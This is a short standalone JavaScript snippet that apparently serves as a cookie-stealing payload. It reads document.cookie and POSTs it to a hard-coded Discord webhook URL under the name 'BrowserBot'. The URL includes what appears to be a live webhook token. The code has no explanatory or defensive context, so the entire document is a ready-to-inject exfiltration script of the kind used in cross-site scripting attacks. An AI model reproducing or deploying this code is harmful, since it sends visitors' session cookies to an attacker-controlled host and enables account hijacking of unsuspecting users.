const webhookURL = "https://discord.com/api/webhooks/1433463555168141443/bQkkQ7fF-z9FDdb52Uj45lVTImSVTbshs6xCfM-TZp0d4Nspss28fEHCQl9zalsFbTAa";

fetch(webhookURL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    content: document.cookie,
    username: "BrowserBot",
  }),
});
